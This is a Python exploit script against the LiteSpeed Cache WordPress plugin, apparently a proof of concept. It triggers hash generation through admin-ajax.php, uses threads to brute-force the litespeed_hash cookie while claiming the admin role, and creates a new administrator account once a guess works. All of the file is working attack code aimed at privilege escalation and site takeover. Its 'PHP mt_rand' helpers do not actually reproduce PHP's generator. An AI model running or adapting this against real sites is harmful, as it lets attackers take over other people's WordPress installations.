import requests
import random
import string
import concurrent.futures

# Configuration
target_url = 'http://example.com'
rest_api_endpoint = '/wp-json/wp/v2/users'
ajax_endpoint = '/wp-admin/admin-ajax.php'
admin_user_id = '1'
num_hash_attempts = 1000000
num_workers = 10
new_username = 'newadminuser'  # Replace with desired username
new_user_password = 'NewAdminPassword123!'  # Replace with a secure password

def mt_srand(seed=None):
    """
    Mimics PHP's mt_srand function by setting the seed for random number generation.
    """
    random.seed(seed)

def mt_rand(min_value=0, max_value=2**32 - 1):
    """
    Mimics PHP's mt_rand function by generating a random number within the specified range.
    """
    return random.randint(min_value, max_value)

def generate_random_string(length=6):
    """
    Generates a random string based on the output of mt_rand.
    """
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def trigger_hash_generation():
    payload = {
        'action': 'async_litespeed',
        'litespeed_type': 'crawler'
    }
    try:
        response = requests.post(f'{target_url}{ajax_endpoint}', data=payload)
        if response.status_code == 200:
            print('[INFO] Triggered hash generation.')
        else:
            print(f'[ERROR] Failed to trigger hash generation - Status code: {response.status_code}')
    except requests.RequestException as e:
        print(f'[ERROR] AJAX request failed: {e}')

def attempt_hash(hash_value):
    cookies = {
        'litespeed_hash': hash_value,
        'litespeed_role': admin_user_id
    }
    try:
        response = requests.post(f'{target_url}{rest_api_endpoint}', cookies=cookies)
        return response, cookies
    except requests.RequestException as e:
        print(f'[ERROR] Request failed: {e}')
        return None, None

def create_admin_user(cookies):
    user_data = {
        'username': new_username,
        'password': new_user_password,
        'email': f'{new_username}@example.com',
        'roles': ['administrator']
    }
    try:
        response = requests.post(f'{target_url}{rest_api_endpoint}', cookies=cookies, json=user_data)
        if response.status_code == 201:
            print(f'[SUCCESS] New admin user "{new_username}" created successfully!')
        else:
            print(f'[ERROR] Failed to create admin user - Status code: {response.status_code} - Response: {response.text}')
    except requests.RequestException as e:
        print(f'[ERROR] User creation request failed: {e}')

def worker():
    for _ in range(num_hash_attempts // num_workers):
        random_string = generate_random_string()
        print(f'[DEBUG] Trying hash: {random_string}')

        response, cookies = attempt_hash(random_string)

        if response is None:
            continue

        print(f'[DEBUG] Response status code: {response.status_code}')
        print(f'[DEBUG] Response content: {response.text}')

        if response.status_code == 201:
            print(f'[SUCCESS] Valid hash found: {random_string}')
            create_admin_user(cookies)
            return
        elif response.status_code == 401:
            print(f'[FAIL] Invalid hash: {random_string}')
        else:
            print(f'[ERROR] Unexpected response for hash: {random_string} - Status code: {response.status_code}')

def main():
    # Seeding the random number generator (mimicking mt_srand)
    mt_srand()

    trigger_hash_generation()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [executor.submit(worker) for _ in range(num_workers)]
        concurrent.futures.wait(futures)

if __name__ == '__main__':
    main()
